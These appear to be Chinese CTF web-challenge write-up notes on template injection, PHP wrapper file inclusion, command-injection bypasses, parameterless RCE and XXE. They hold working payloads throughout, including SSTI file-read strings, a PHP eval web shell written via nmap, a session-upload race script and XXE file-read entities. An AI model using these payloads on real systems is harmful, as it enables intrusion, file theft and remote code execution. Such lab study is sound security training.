    pop()        # pop() 方法删除字典给定键 key 所对应的值，返回值为被删除的值
  ```

  ```python
    app = flask.Flask(__name__)
    app.config['FLAG'] = os.environ.pop('FLAG')
    #flask模块生成了app ，在app的config内定义了FLAG参数，参数的值为os环境变量的FLAG值
  ```

  从这里可以知道flag的位置

  访问`/shrine/{{2*'2'}}`返回22 => jinja模板注入

  源代码进行了两次过滤，分别过滤了 "(",")" 和config，self，但是要拿到flag必须用到config

  利用python里面的内置函数，比如url_for和get_flashed_messages

  ```python
    config 对象:

    config 对象就是Flask的config对象，也就是 app.config 对象。

    {{ config.SQLALCHEMY_DATABASE_URI }}

    url_for() 方法:

    url_for() 会返回视图函数对应的URL。如果定义的视图函数是带有参数的，则可以将这些参数作为命名参数传入。

    get_flashed_messages() 方法：

    返回之前在Flask中通过 flash() 传入的flash信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(flash信息只能取出一次，取出后flash信息会被清空)。
  ```

  注入`{{url_for.__globals__}}`查看里面的变量信息

  注入`{{url_for.__globals__['current_app'].config}}`获取flag

### BJDCTF2020 The mystery of ip/Cookie is so stable

1. 考点

    1. X-Forwarded-For注入(The mystery of **ip**)

       cookie注入(Cookie is so stable)
    2. PHP可能存在Twig模版注入漏洞，Flask可能存在Jinjia2模版注入漏洞

2. 解法

    看网上的wp，都说是SSTI模板注入漏洞

    有一种解题思路就是尝试在可能的注入点测试，尝试各种方法查看能否控制其输出内容

    一种方法是：在参数后加{{}}，在花括号内写计算式查看页面输出的是结果还是计算式本身从而判断是否为SSTI模板注入。
    ![模板类型判断](image.png)
    这里的绿线表示结果成功返回，红线反之

    ```txt
    {{7*'7'}} 回显7777777 ==> Jinja2
    {{7*'7'}} 回显49 ==> Twig
    ```

### GYCTF2020 FlaskApp

1. 题目提示flask，可以尝试一下**SSIT**
  
  加密页面输入`{{2+2}}`页面正常返回base64加密后的密文，复制密文放到解码页面，得到结果4==>注入点在解码页面

2. 在解密页面随便输入引发报错得到解码页面后端处理逻辑，发现有waf防护
   
   查看源码 `{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}`

   waf 黑名单：`black_list = ["flag","os","system","popen","import","eval","chr","request", "subprocess","commands","socket","hex","base64","*","?"]`

3. waf绕过方法有很多，字符串拼接、逆序等。
   
   字符串拼接：`{{c.__init__.__globals__.['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}`

   逆序：`{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}`

### RootersCTF2019I_<3_Flask(Jinja2)

**这道题目考点主要是两个工具`Arjun`和`tplmap`**

1. 刚进去什么都没有，扫描目录，看源码什么都没发现
2. 看过wp才知道主要是用工具
3. 首先用`arjun`爆破参数，查找网站有哪些可用的参数
4. 然后用`tplmap`探测模板注入漏洞以及getshell

    [arjun Usage](https://github.com/s0md3v/Arjun/wiki/Usage)
    [tplmap](https://github.com/epinna/tplmap)

### CISCN2019华东南赛区Double Secret

- **考点**
  - RC4加密(流密码)
  - Jinja2

1. dirsearch扫描，发现了`console`,`secret`,`robots.txt`三个页面
2. 访问console时发现flask开启了debug模式，猜到这道题可能是ssti
3. 访问secret页面提示了`Tell me your secret.I will encrypt it so others can't see`这么一句话。就尝试了一下传入secret参数，成功了。测试了几次之后没发现加密规则，后来发现输入的参数一变长就会报错，而且会有很多报错信息，从报错信息中发现是RC4加密，即流加密，而且还给出了密钥。
4. 所以我们可以将payload RC4加密后注入就行了，结果会直接在页面上显示。

    [RC4加密脚本](./rc4.py)

    题目有过滤，但是没什么用。就给一个警告信息。可以采用反转，字符串拼接绕过。

### SCTF2019 Flag Shop(Ruby ERB模板注入)

[【技术分享】手把手教你如何完成Ruby ERB模板注入](https://www.anquanke.com/post/id/86867)

1. 尝试爆破

看到题目感觉和cookie相关，先抓了一下包，发现了jwt，尝试爆破，没有马上出来结果，所以key应该不是靠爆破拿到的

2. 找源码

尝试访问一下robots.txt,里面提示了源码位置

```ruby
require 'sinatra'
require 'sinatra/cookies'
require 'sinatra/json'
require 'jwt'
require 'securerandom'
require 'erb'

set :public_folder, File.dirname(__FILE__) + '/static'

FLAGPRICE = 1000000000000000000000000000
ENV["SECRET"] = SecureRandom.hex(64)

configure do
  enable :logging
  file = File.new(File.dirname(__FILE__) + '/../log/http.log',"a+")
  file.sync = true
  use Rack::CommonLogger, file
end

get "/" do
  redirect '/shop', 302
end

get "/filebak" do
  content_type :text
  erb IO.binread __FILE__
end

get "/api/auth" do
  payload = { uid: SecureRandom.uuid , jkl: 20}
  auth = JWT.encode payload,ENV["SECRET"] , 'HS256'
  cookies[:auth] = auth
end

get "/api/info" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  json({uid: auth[0]["uid"],jkl: auth[0]["jkl"]})
end

get "/shop" do
  erb :shop
end

get "/work" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end

  if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result
  end
end

post "/shop" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }

  if auth[0]["jkl"] < FLAGPRICE then

    json({title: "error",message: "no enough jkl"})
  else

    auth << {flag: ENV["FLAG"]}
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    json({title: "success",message: "jkl is good thing"})
  end
end


def islogin
  if cookies[:auth].nil? then
    redirect to('/shop')
  end
end
```
没看出来这是什么代码，但是发现key很长，所以爆破行不通，到这没思路了

3. ERB模板注入

去找了一下wp，这是ruby语法，存在ruby ERB模板注入

重点是这一块,传入的参数do和name相等，则输出。

```ruby
if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result
end
```
ruby模板注入形式

```ruby
<%= 7 * 7 %>
<%= File.open('/etc/passwd').read %>
```

其中`<%=%>`占用五个字符，而题目只给了七个可控字符。

所以这里利用ruby的预定义变量，只用两个字符。但是幸运的是，Ruby为我们提供了预定义字符。

>$' 最后一次模式匹配中匹配部分之后的字符串

让我们看看运行到这句话之前的最后一个模式匹配在哪里？

```ruby
unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
```

就是在匹配SECRET，这个预定义字符的作用是将匹配之后的字符进行返回。

```ruby
hello world //我设置匹配字符为e
llo world //这就是返回值
```

我们要想得到完整的SECRET，那就必须传进去一个空的SECRET，让最后的返回值是完整的。
所以我们如此构造payload

```ruby
?name=<%=$'%>&do=<%=$' is working%>&SECRET=
```

这样我们就能拿到jwt的key了

拿到后用这个key伪造jwt，把jkl改成足够的数量，然后发送过去，flag就在jwt中

## PHP伪协议

### [BSidesCF 2020]Had a bad day(文件包含)

点击页面中的按钮，GET传参，可能存在注入点，测试后发现不是SQL注入，根据报错信息得出和文件读取有关。更换参数网页提示只支持两个函数，读取index.php源码,

payload:`php://filter/convert.base64-encode/resource=index`

源码

```php
    $file = $_GET['category'];
    if(isset($file)){
        if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
            include ($file . '.php');
        }else{
            echo "Sorry, we currently only support woofers and meowers.";
        }
    }
```

通过代码审计，发现后台对于函数的判断用的只是`strpos`

strpos — 查找字符串首次出现的位置

所以只要category包含这三个名称就可以，所以可以以此来构造payload

payload: `php://filter/convert.base64-encode/resource=index/../flag` 或 `php://filter/convert.base64-encode/index/resource=flag`

1. php://filter/

    1. String Filter (字符串过滤器)

        ```php
        string.rot13/resource=flag.php
        # string.rot13对字符串执行 ROT13 转换，ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。
        string.toupper/resource=flag.php
        # string.toupper 将字符串转化为大写
        string.tolower/resource=flag.php
        # string.tolower 将字符串转化为小写
        string.strip_tags/resource=flag.php
        # string.strip_tags从字符串中去除 HTML 和 PHP 标记，尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果
        ```

    2. Conversion Filter(转化过滤器)

        ```php
        convert.base64-encode & convert.base64-decode

        convert.iconv.<input-encoding>.<output-encoding> 
        # or 
        convert.iconv.<input-encoding>/<output-encoding>

        convert.quoted-printable-encode & convert.quoted-printable-decode

        # <input-encoding>和<output-encoding> 就是编码方式，有如下几种;
        ```

        ```php
        UCS-4*
        UCS-4BE
        UCS-4LE*
        UCS-2
        UCS-2BE
        UCS-2LE
        UTF-32*
        UTF-32BE*
        UTF-32LE*
        UTF-16*
        UTF-16BE*
        UTF-16LE*
        UTF-7
        UTF7-IMAP
        UTF-8*
        ASCII*
        BASE64
        ```

   3. Compression Filters(压缩过滤器)

        ```php
        # zlib.deflate（压缩）和 zlib.inflate（解压）
        zlib.deflate/resource=flag.php
        zlib.deflate|zlib.inflate/resource=flag.php

        # bzip2.compress和 bzip2.decompress
        # 同上
        ```

### N1CTF 2018 eating_cms

#### 知识点

- parse_url 函数解析漏洞

    parse_url 函数在解析时存在漏洞
    在路径前多输入"//" 就会导致这个函数失效
    如: `//user.php?page=php://filter/convert.base64-encode/resource=xxx`
- 伪协议读文件
- 命令执行

#### 解题

1. 看到登录页面，尝试了一下注册路径 `/register.php`, 存在注册页面，注册一个账户登录，看了一下源码，没发现什么有用的东西
2. 猜测可能有sql注入，先fuzz了一下sql关键字，和报错注入的几个函数被禁了，括号，# 和空格也被禁了，尝试了一下单引号，可以通过，但是会被转义，所以应该与sql注入无关。
3. 到这没思路了，看了wp，登录后的url存在一个page参数，这种情况可以尝试一下php伪协议读文件

    在user.php中发现包含了function.php,读了一下function.php,在这个文件中发现waf过滤了几个文件，那我们就尝试访问一下

    ```php
    function filter_directory()
    {
        $keywords = ["flag","manage","ffffllllaaaaggg"];
        $uri = parse_url($_SERVER["REQUEST_URI"]);
        parse_str($uri['query'], $query);
    //    var_dump($query);
    //    die();
        foreach($keywords as $token)
        {
            foreach($query as $k => $v)
            {
                if (stristr($k, $token))
                    hacker();
                if (stristr($v, $token))
                    hacker();
            }
        }
    }
    ```
    但是这几个名称都被过滤了，但是在解析url时它用到了parse_url函数，这里就要利用这个函数的解析漏洞

    payload: `//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg`

    这样就能读取到文件了

    ```php
    <?php
    if (FLAG_SIG != 1){
        die("you can not visit it directly");
    }else {
        echo "you can find sth in m4aaannngggeee";
    }
    ?>
    ```
    读取m4aaannngggeee

    ```php
    <?php
    if (FLAG_SIG != 1){
        die("you can not visit it directly");
    }
    include "templates/upload.html";
    ?>
    ```
    访问`http://e6cd3ddc-023e-46e1-a2ee-f2b6a66d576f.node3.buuoj.cn/templates/upload.html`发现文件上传，上传以后404

    读取upllloadddd.php
    //user.php?page=php://filter/convert.base64-encode/resource=upllloadddd.php
    ```php
    <?php
    $allowtype = array("gif","png","jpg");
    $size = 10000000;
    $path = "./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/";
    $filename = $_FILES['file']['name'];
    if(is_uploaded_file($_FILES['file']['tmp_name'])){
        if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){
            die("error:can not move");
        }
    }else{
        die("error:not an upload file！");
    }
    $newfile = $path.$filename;
    echo "file upload success<br />";
    echo $filename;
    $picdata = system("cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/".$filename." | base64 -w 0");
    echo "<img src='data:image/png;base64,".$picdata."'></img>";
    if($_FILES['file']['error']>0){
        unlink($newfile);
        die("Upload file error: ");
    }
    $ext = array_pop(explode(".",$_FILES['file']['name']));
    if(!in_array($ext,$allowtype)){
        unlink($newfile);
    }
    ?>
    ```
    没有任何过滤，非常明显的文件名代码执行漏洞，接着就是找到真正的上传点

    之前读文件还发现一个m4aaannngggeee页面，找到上传点/user.php?page=m4aaannngggeee

    上传文件，抓包修改文件名就可以了。

## BJDCTF2020 ZJCTF，不过如此(文件包含 + RCE-远程代码执行)

源码

```php
    <?php
    error_reporting(0);
    $text = $_GET["text"];
    $file = $_GET["file"];
    if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
        echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
        if(preg_match("/flag/",$file)){
            die("Not now!");
        }

        include($file);  //next.php
        
    }
    else{
        highlight_file(__FILE__);
    }
    ?>
```

对于text参数并非简单的get传参，file_get_contents()这个函数是读取名为text文件中的内容

第一次绕过，绕过对text的过滤(两种方法)

1. `php://input`,这种需要在请求头最后加上post参数(I have a dream)。
2. data://text/plain,I%20have%20a%20dream

接着就是file参数，利用`php://filter/convert.base64-encode/resource=next.php`读取next.php源码

[PHP文件包含漏洞利用思路与Bypass总结手册（一）](https://blog.csdn.net/qq_38154820/article/details/105839776)

```php
    <?php
    $id = $_GET['id'];
    $_SESSION['id'] = $id;

    function complex($re, $str) {
        return preg_replace(
            '/(' . $re . ')/ei',
            'strtolower("\\1")',
            $str
        );
    }
    foreach($_GET as $re => $str) {
        echo complex($re, $str). "\n";
    }
    function getFlag(){
        @eval($_GET['cmd']);
    }
```

这里主要涉及到preg_replace RCE(远程代码执行)漏洞

[Thinkphp5 RCE总结](https://y4er.com/posts/thinkphp5-rce/)

 preg_replace 使用了 /e 模式，导致可以代码执行，而且该函数的第一个和第三个参数都是我们可以控制的。preg_replace 函数在匹配到符号正则的字符串时，会将替换字符串（也就是代码中 preg_replace 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 'strtolower("\\1")' 字符串，在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。 注意：双引号中的函数不会被执行和替换

 所以到现在就是要构造主要就是构造`preg_replace('.*')/ei','strtolower("\\1")', {${此处填函数名}})`;

 在PHP中，对于传入的非法的`$_GET`数组参数名，会将其转换成下划线。

 payload: `\S*=${eval($_POST[cmd])}`同时再POST一个`cmd=system("ls /");` 或者 `\S*=${getFlag()}&cmd=system('ls /');`

 ## WMCTF2020 Make PHP Great Again(文件包含)

 1. 源码

    ```php
    <?php
    highlight_file(__FILE__);
    require_once 'flag.php';
    if(isset($_GET['file'])) {
    require_once $_GET['file'];
    }
    ```

    这道题文件包含用的require_once(),这个函数的特点是是包含一次，因为开始包含过一次flag.php,正常来说不能再包含了，所以需要绕过

2. require_once()在对软链接的操作上存在一些缺陷，软连接层数较多会使hash匹配直接失效造成重复包含，超过20次软链接后可以绕过，外加伪协议编码一下：

    ```url
    ?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
    ```

    也可以利用PHP_SESSION_UPLOAD_PROGRESS上传文件后进行文件包含：

    ```php
    #coding=utf-8
 
    import io 
    import requests
    import threading
    sessid = 'TGAO'
    data = {"cmd":"system('tac /var/www/html/flag.php');"}
    def write(session):
        while True:
            f = io.BytesIO(b'a' *100* 50)
            resp = session.post( 'http://3735466b-1305-491e-b32c-4733f9b9f113.node3.buuoj.cn/', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )
    def read(session):
        while True:
            resp = session.post('http://3735466b-1305-491e-b32c-4733f9b9f113.node3.buuoj.cn/?file=/tmp/sess_'+sessid,data=data)
            if 'tgao.txt' in resp.text:
                print(resp.text)
                event.clear()
            else:
                pass
    if __name__=="__main__":
        event=threading.Event()
        with requests.session() as session:
            for i in range(1,30):
                threading.Thread(target=write,args=(session,)).start()
    
            for i in range(1,30):
                threading.Thread(target=read,args=(session,)).start()
        event.set()
    ```

## BUUCTF2018 Onlion Tool(RCE+文件上传漏洞)

源码

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    //escapeshellarg
    //1,确保用户值传递一个参数给命令
    //2,用户不能指定更多的参数
    //3,用户不能执行不同的命令
    $host = escapeshellcmd($host);
    //escapeshellcmd
    //1,确保用户只执行一个命令
    //2,用户可以指定不限数量的参数
    //3,用户不能执行不同的命令
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

代码中这两个函数比较特殊，即`escapeshell`函数的：

```php
escapeshellarg()
escapeshellcmd()
```

这两个函数按代码里这样的顺序使用，是会产生漏洞的，反之就不会。

```php
escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数
功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，
这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)
```

```php
escapeshellcmd — shell 元字符转义
功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。
此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。

反斜线（\）会在以下字符之前插入：
&#;`|?~<>^()[]{}$, \x0A 和 \xFF。 *’ 和 “ 仅在不配对的时候被转义。
在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
```

举例来说

1. 传入的参数是：`' <?php @eval($_POST["cmd"]);?> -oG eval.php '`
经过escapeshellarg处理后变成了`''\'' <?php @eval($_POST["cmd"]);?> -oG aaa.php '\'' '`，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
2. 经过escapeshellcmd处理后变成`''\\'' \<\?php @eval\(\$_POST\["cmd"\]\)\;\?\> -oG aaa.php '\\'' '`，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：
最后执行的命令是`nmap -T5 -sT -Pn --host-timeout 2 -F -oG eval.php \ <?php @eval($_POST[cmd]);?> \\`，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。

### 网鼎杯2020朱雀组Nmap-同样的题目

只是在这道题里面会过滤php，因此需要将木马换成短标签即`<?= ... ?>`, 然后php文件后缀名可以换成`.phtml`

## [GXYCTF2019]禁止套娃(.git泄露+无参RCE)

1. dirsearch 扫描网站目录发现.git文件，可以判断是git泄露，通过GitHack将泄露文件下载到本地，发现网站源码

```php
    <?php
    include "flag.php";
    echo "flag在哪里呢？<br>";
    if(isset($_GET['exp'])){
        if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
            if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
                if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                    // echo $_GET['exp'];
                    @eval($_GET['exp']);
                }
                else{
                    die("还差一点哦！");
                }
            }
            else{
                die("再好好想想！");
            }
        }
        else{
            die("还想读flag，臭弟弟！");
        }
    }
    // highlight_file(__FILE__);
    ?>
```

```PHP
    ';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])
```

 这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个()，那么这个字符串就会被替换为空，如果替换后只剩下;，那么这个条件就成立。

 +：量词：匹配1到无穷次，尽可能多匹配，如果有必要，回溯匹配更少内容（贪婪）

 (?R)?递归引用整个表达式  后面的?是量词，匹配0个到1个，尽可能多匹配如果有必要，回溯更少的内容（贪婪）

[一般无参RCE的三种绕过方式](https://blog.csdn.net/Manuffer/article/details/120738755)

[RCE篇之无参数rce](https://www.cnblogs.com/pursue-security/p/15406272.html)

由于最后一个if判断过滤了大部分关键字导致get类函数不能用

我们要先看目录 使用scandir('.');但是不能出现一点，因为.不在正则里，exp里有.preg_replace()函数调用后就会有.，就不是;了

`localeconv()`函数返回一包含本地数字及货币格式信息的数组,而数组第一项就是一点

`current()`返回数组中的当前单元, 默认取第一个值。这里我们就能够得到当前目录了

`exp=print_r(scandir(current(localeconv())));`

回显是：`Array ( [0] => . [1] => .. [2] => .git [3] => flag.php [4] => index.php )`

思考一下怎么得到flag.php:

`array_reverse()`函数以相反的元素顺序返回数组。

 `?exp=print_r(array_reverse(scandir(current(localeconv()))));`

返回`Array ( [0] => index.php [1] => flag.php [2] => .git [3] => .. [4] => . )`

这样flag.php就在数组里的第二个，再用`next()`函数得到指针下一个元素，

`?exp=print_r(next(array_reverse(scandir(current(localeconv())))));`

返回flag.php

再用`highlight_file()`函数得到flag.php的源码

payload:`?exp=print_r(highlight_file(next(array_reverse(scandir(current(localeconv()))))));`

## XXE-XML External Entity Injection(XML外部实体注入)

### NCTF2019 Fake/True XML cookbook

[从XML相关一步一步到XXE漏洞](https://xz.aliyun.com/t/6887?time__1311=n4%2BxnD0DRDyB5AKDsYohrYYK0KmvD7KPx&alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6887#toc-2)
[XXE漏洞详细讲解](https://xz.aliyun.com/t/3357#toc-23)

1. XXE漏洞原理：发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。XXE漏洞触发的点往往是可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件。

   - DOCTYPE（文档类型定义的声明）
   - ENTITY（实体的声明）
   - SYSTEM、PUBLIC（外部资源申请）

   ```xml
   <?xml version = "1.0" encoding = "utf-8"?>
    <!DOCTYPE test [
        <!-- 读文件 -->
        <!ENTITY admin SYSTEM "file:///flag">
        <!-- 内网端口扫描 -->
        <!ENTITY test SYSTEM "http://ip:port/">
        <!-- 内网探测 -->
        <!ENTITY test SYSTEM "https://ip">
    ]>
    <user><username>&admin;</username><password>{任意值}</password></user>
   ```
   **内网探测用到的文件**
    - /etc/hosts 储存域名解析的缓存
    - /etc/passwd 用户密码
    - /proc/net/arp 每个网络接口的arp表中dev包
    - /proc/net/fib_trie ipv4路由表

2. payload:

   ```xml
   <!-- Fake -->
    <?xml version = "1.0" encoding = "utf-8"?>
    <!DOCTYPE test [
        <!ENTITY admin SYSTEM "file:///flag">
    ]>
    <user><username>&admin;</username><password>1123</password></user>
    <!-- True -->
    <?xml version = "1.0" encoding = "utf-8"?>
    <!DOCTYPE test [
        <!ENTITY test SYSTEM "http://10.253.81./">
    ]>
    <user><username>&test;</username><password>1123</password></user>
   ```

### CSAWQual 2019 Web_Unagi

这道题和上面一道题目一样，都是XXE,不一样的地方是这道题目是以上传文件的形式读取文件的

题目中提示有实例模板和flag的位置，看到示例模板，发现xml类型，所以就想到了XXE

1. 首先把payload写入文件，文件后缀名xml
    ```xml
    <?xml version = "1.0"?>
    <!DOCTYPE users [
        <!ENTITY admin SYSTEM "file:///flag">]>
    <users>
        <user>
            <username>&admin;</username>
            <password>1123</password>
            <name>&admin;</name>
            <email>a@a.com</email>
            <group>CSAW2019</group>
            <intro>&admin;</intro>
        </user>
    </users>
    ```
2. 用下面命令更改编码方式

    XXE 绕过WAF保护

    >一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。
    
    >在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集

    ```bash
    cat xml.xml | iconv -f UTF-8 -t UTF-16BE > 1.xml
    ```
3. 上传1.xml

    经过测是，在name处的flag被截断了，可能有长度限制，intro标签处可以正常输出

    还有wp说可以报错带出数据

    payload如下，未经测试：

    ```xml
    <?xml version='1.0' encoding="utf-16"?>
    <!DOCTYPE message[ 
    <!ELEMENT message ANY >
    <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "file:///flag">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///yemoli/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    '>
    %NUMBER;
    ]> 
    <users>
    <user>
        <username>bob</username>
        <password>passwd2</password>
        <name>Bob</name>
        <email>bob@fakesite.com</email>
        <group>&xxe;</group>
    </user>
    </users>
    ```

### BSidesCF 2019SVGMagic(SVG+XML)

SVG是一种用XML定义的语言，SVG图形是可交互的和动态的，可以在SVG文件中嵌入动画元素或通过脚本来定义动画。

也就是说这里的SVG是个XML,并且存在可控的内容，那么自然就会想到XXE

构造文件内容

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt">
]>
<svg height="200" width="1000">
	<text x="20" y="20">&file;</text>
</svg>
```

这里可以通过调整宽度使flag显示完整。

## BJDCTF2020 Mark loves cat(.git目录泄露+代码审计)

1. 进去之后找不到有用的信息，dirsearch扫描目录，发现.git泄露
2. GitHack下载泄露文件找到源码

   flag.php

   ```php
    <?php
    $flag = file_get_contents('/flag');
   ```

   index.php

   ```php
    <?php

    include 'flag.php';

    $yds = "dog";
    $is = "cat";
    $handsome = 'yds';

    foreach($_POST as $x => $y){
        $$x = $y;
    }

    foreach($_GET as $x => $y){
        $$x = $$y;
    }

    foreach($_GET as $x => $y){
        if($_GET['flag'] === $x && $x !== 'flag'){
            exit($handsome);
        }
    }

    if(!isset($_GET['flag']) && !isset($_POST['flag'])){
        exit($yds);
    }

    if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
        exit($is);
    }
    echo "the flag is: ".$flag;
   ```

3. 根据源码可以发现有变量覆盖漏洞，可以利用三处exit

    1. 利用 exit($handsome);

        `if($_GET['flag'] === $x && $x !== 'flag')`

        即flag的值等于这个键名并且这个键名不能等于flag，有点绕，但思考一下还是能理解，这里普遍利用诸如：?handsome=flag&flag=handsome

        `$$x=$$y`就是用值覆盖键，所以，第一组覆盖完之后$handsome=$flag=handsome(第二组还没有被覆盖)($x=handsome,$y=flag),第二组覆盖完之后$flag=$handsome=handsome($x=flag,$y=handsome),if判断的时候满足条件，exit($handsome)其实就是exit($flag),因为url里面flag的参数并没有带入php代码中,但是在if判断时却被$x,$y带进来了，所以$flag还是文件中的内容。

    2. 利用exit($yds)

        payload: `?yds=flag`,用值覆盖键$yds=$flag;

    3. 利用exit($is)

        payload: `?flag=flag&is=flag`

## WUSTCTF2020 朴实无华(MD5碰撞+php-intval()绕过)

打开网页什么都没有，还是乱码，先试着访问一下robots.txt,进去了提示`/fAke_f1agggg.php`,那就接着访问这个网页，不出所料，flag不在这F12看源码，发现header里面有提示`/fl4g.php`,进去发现乱码，在firefox上可以Alt->查看->修复网页编码，变成正常的样子。

```php
//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?> 
```

审计代码会发现这三个if都需要满足否则就会die。

- level1：

    ```php
        if(intval($num) < 2020 && intval($num + 1) > 2021)
    ```

    发现这在正常情况下无法成立，F12会发现`X-Powered-By: PHP/5.5.38`,然后这个版本的intval()函数有个漏洞：

    根据intval()函数的使用方法，当函数中用字符串方式表示科学计数法时，函数的返回值是科学计数法前面的一个数，而对于科学计数法加数字则会返回科学计数法的数值

    所以我们就需要用科学计数法的形式传入num并且这个数在+1后要大于2021。

- level2

    ```php
        if ($md5==md5($md5))
    ```

    PHP处理hash字符串时，会将每一个以0E开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以0E开头的，那么PHP会认为它们相同。

    也就是以0E开头的字符串，加密后还是以0e开头即可在弱类型比较时均转换成整数0。+

    部分md5加密后软比较判断相等的值

    ```txt
        0e215962017
        0e730083352
        0e807097110
        0e840922711
    ```

    查找md5碰撞的代码

    ```php
        <?php
        for ($a = 100000000; $a <= 999999999; $a++) {
            $md5 = '0e'.$a;
            if ($md5 == md5($md5)) {
                echo '0e' . $a;
                echo "\t";
                echo $md5, "\n";
            }
        }
